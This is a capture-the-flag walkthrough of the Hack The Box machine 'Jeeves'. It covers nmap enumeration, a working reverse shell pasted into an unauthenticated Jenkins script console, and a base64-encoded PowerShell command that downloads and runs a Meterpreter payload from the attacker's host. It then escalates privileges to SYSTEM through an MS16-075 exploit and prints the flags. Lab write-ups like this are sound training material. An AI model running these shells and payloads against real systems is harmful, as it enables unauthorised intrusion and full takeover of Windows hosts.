# Jeeves

URL: https://app.hackthebox.com/machines/Jeeves

Level: Medium

Date 7 May 2021

## Walkthrough

- [Enumeration](#enumeration)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Sun May  2 20:55:41 2021 as: nmap -A -T4 -p- -oN 01_nmap.txt 10.10.10.63
Nmap scan report for 10.10.10.63
Host is up (0.045s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), FreeBSD 6.2-RELEASE (86%), Microsoft Windows 10 1607 (85%), Microsoft Windows 10 1511 (85%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m55s, deviation: 0s, median: 4h59m55s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-05-02T23:57:52
|_  start_date: 2021-05-02T23:54:11

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   44.57 ms 10.10.14.1
2   45.54 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  2 20:58:34 2021 -- 1 IP address (1 host up) scanned in 174.69 seconds
```

On port 80/TCP we get a simple search form which returns everytime an error (a static image!)... so we inspect port 50000/TCP:

```
gobuster dir -u http://10.10.10.63:50000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o 4_gobuster_port50000.txt
/askjeeves (Status: 302)
```

We found a Jenkins web interface:

```
http://10.10.10.63:50000/askjeeves
```

From here, we go to "Manage Jenkins" and then "Script Console".

We insert this code (a simple ruby reverse shell):

```
String host="10.10.14.28";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

and we get connection on our listener with netcat:

```
root@kali:/opt/htb/Jeeves# nc -nvlp 8044
listening on [any] 8044 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.63] 49676
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>
```

# User-flag

From here we can easily grab user flag on "kohsuke" Desktop.

# Privesc

```
C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Users\Administrator\.jenkins>
```

System info:

```
Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          5/7/2021, 6:29:51 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,168 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,734 MB
Virtual Memory: In Use:    953 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.63
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

We try to upgrade our shell to `meterpreter`:

```
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/sc
use exploit/multi/scada/inductive_ignition_rce  use exploit/multi/script/web_delivery
msf6 > use exploit/multi/sc
use exploit/multi/scada/inductive_ignition_rce  use exploit/multi/script/web_delivery
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python


msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.28
SRVHOST => 10.10.14.28
msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.14.28
LHOST => 10.10.14.28
msf6 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.14.28      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python


msf6 exploit(multi/script/web_delivery) > optrions
[-] Unknown command: optrions.
msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.14.28      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python


msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > optins
[-] Unknown command: optins.
msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  10.10.14.28      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   PSH


msf6 exploit(multi/script/web_delivery) >

msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

And we obtain this code:

```
msf6 exploit(multi/script/web_delivery) > powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABxAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHEALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABxAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA4ADoAOAAwADgAMAAvAGMAZABUAEMAUwBMAGUAUQBpAEIAUgBnAC8AbwBmAGkAbABSAEUAZgB4AEwARgAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA4ADoAOAAwADgAMAAvAGMAZABUAEMAUwBMAGUAUQBpAEIAUgBnACcAKQApADsA

msf6 exploit(multi/script/web_delivery) >
```

We get reverse shell:

```
msf6 exploit(multi/script/web_delivery) >
[*] 10.10.10.63      web_delivery - Delivering AMSI Bypass (939 bytes)
[*] 10.10.10.63      web_delivery - Delivering Payload (1896 bytes)
[*] Sending stage (175174 bytes) to 10.10.10.63
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.63:49678) at 2021-05-07 19:51:09 +0200
```

We check our privileges:

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```


We check running processes:

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User            Path
 ---   ----  ----               ----  -------  ----            ----
 0     0     [System Process]
 4     0     System
 244   3768  powershell.exe     x86   0        JEEVES\kohsuke  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 388   3920  conhost.exe        x64   0        JEEVES\kohsuke  C:\Windows\System32\conhost.exe
 504   4     smss.exe
 576   756   svchost.exe
 580   572   csrss.exe
 608   756   vmacthlp.exe
 652   572   wininit.exe
 664   644   csrss.exe
 716   644   winlogon.exe
 752   756   svchost.exe
 756   652   services.exe
 764   652   lsass.exe
 840   756   svchost.exe
 872   756   svchost.exe
 928   756   svchost.exe
 972   716   dwm.exe
 1016  756   svchost.exe
 1028  756   svchost.exe
 1036  756   svchost.exe
 1220  756   svchost.exe
 1308  756   spoolsv.exe
 1476  1508  conhost.exe        x64   0        JEEVES\kohsuke  C:\Windows\System32\conhost.exe
 1508  3004  java.exe           x86   0        JEEVES\kohsuke  C:\ProgramData\Oracle\Java\javapath_target_1244625\java.exe
 1604  756   svchost.exe
 1620  756   svchost.exe
 1752  756   MsMpEng.exe
 1760  756   svchost.exe
 1776  756   vmtoolsd.exe
 1784  756   VGAuthService.exe
 1800  756   svchost.exe
 2008  576   dasHost.exe
 2056  756   svchost.exe
 2376  840   dllhost.exe
 2396  840   WmiPrvSE.exe
 2564  756   dllhost.exe
 2672  756   msdtc.exe
 2708  3768  conhost.exe        x64   0        JEEVES\kohsuke  C:\Windows\System32\conhost.exe
 2732  716   LogonUI.exe
 2872  756   NisSrv.exe
 3004  756   jenkins.exe        x64   0        JEEVES\kohsuke  C:\Users\Administrator\.jenkins\jenkins.exe
 3120  756   SearchIndexer.exe
 3768  1508  cmd.exe            x86   0        JEEVES\kohsuke  C:\Windows\SysWOW64\cmd.exe
 3920  2688  cmd.exe            x86   0        JEEVES\kohsuke  C:\Windows\SysWOW64\cmd.exe

```

And we migrate to `388` since it is 64bit.

```
meterpreter > migrate 388
[*] Migrating from 1508 to 388...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : JEEVES
OS              : Windows 10 (10.0 Build 10586).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

We use suggester and we found `ms16_075_reflection_juicy`:

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/local/ms16_075_reflection) > use exploit/windows/local/ms16_075_reflection_juicy
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) > options

Module options (exploit/windows/local/ms16_075_reflection_juicy):

   Name     Current Setting                         Required  Description
   ----     ---------------                         --------  -----------
   CLSID    {4991d34b-80a1-4291-83b6-3328366b9097}  yes       Set CLSID value of the DCOM to trigger
   SESSION                                          yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.88.10    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/local/ms16_075_reflection_juicy) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LHOST 10.10.14.28
LHOST => 10.10.14.28
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/local/ms16_075_reflection_juicy) > options

Module options (exploit/windows/local/ms16_075_reflection_juicy):

   Name     Current Setting                         Required  Description
   ----     ---------------                         --------  -----------
   CLSID    {4991d34b-80a1-4291-83b6-3328366b9097}  yes       Set CLSID value of the DCOM to trigger
   SESSION  1                                       yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/local/ms16_075_reflection_juicy) > run

[*] Started reverse TCP handler on 10.10.14.28:5555
[+] Target appears to be vulnerable (Windows 10 (10.0 Build 10586).)
[*] Launching notepad to host the exploit...
[+] Process 2552 launched.
[*] Reflectively injecting the exploit DLL into 2552...
[*] Injecting exploit into 2552...
[*] Exploit injected. Injecting exploit configuration into 2552...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (200262 bytes) to 10.10.10.63
[*] Meterpreter session 2 opened (10.10.14.28:5555 -> 10.10.10.63:49702) at 2021-05-07 23:33:06 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We look for root flag:

```
C:\Windows\system32>cd c:\users\administrator\desktop
cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,394,758,656 bytes free

c:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
c:\Users\Administrator\Desktop>dir
```

We then use `dir /R`:

```
c:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of c:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,394,754,560 bytes free

c:\Users\Administrator\Desktop>
```

and we get content with `more`:

```
c:\Users\Administrator\Desktop>more < hm.txt:root.txt:$DATA
more < hm.txt:root.txt:$DATA
afbc5bd4b615a60648cec41c6ac92530
```


 

